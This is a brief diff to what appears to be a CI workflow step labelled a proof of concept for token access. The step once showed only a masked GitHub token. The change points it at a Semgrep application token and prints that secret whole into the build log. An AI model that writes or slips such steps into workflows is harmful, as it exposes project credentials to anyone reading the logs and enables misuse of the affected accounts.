@@ -12,9 +12,7 @@ jobs:
 
       - name: Prove GITHUB_TOKEN Access (Obfuscated)
         run: |
-          TOKEN="${{ secrets.GITHUB_TOKEN }}"
+          TOKEN="${{ secrets.SEMGREP_APP_TOKEN }}"
 
           echo "=== Proof of Concept ==="
-          echo "Token length: ${#TOKEN}"
-          echo "Token prefix: ${TOKEN:0:4}****"
-          echo "Token suffix: ****${TOKEN: -4}"
+          echo "${{ secrets.SEMGREP_APP_TOKEN }}"
